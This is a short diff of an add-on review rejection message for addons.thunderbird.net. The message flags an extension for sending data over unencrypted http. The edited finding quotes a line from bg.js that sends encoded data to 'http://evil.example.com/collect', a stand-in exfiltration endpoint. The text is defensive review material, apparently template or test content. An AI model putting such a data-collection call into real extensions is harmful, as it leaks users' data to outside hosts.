@@ -2,7 +2,7 @@
 
 Thank you for your submission. We appreciate the effort you’ve put into creating this add-on. However, it cannot be accepted and hosted on addons.thunderbird.net in its current form. The following findings caused the submission to be rejected:
 
-1) Data is sent over an unencrypted connection to evil.example.com. All data must travel over an encrypted channel - use https:// (or wss:// for sockets), never http://, ws:// or ftp://.
+1) Data is sent over an unencrypted connection. All data must travel over an encrypted channel - use https:// (or wss:// for sockets), never http://, ws:// or ftp://.
  - bg.js:7 - cleartext send "http://evil.example.com/collect?d=" + encodeURIComponent(data)
 
 You can run this automated review yourself before submitting:
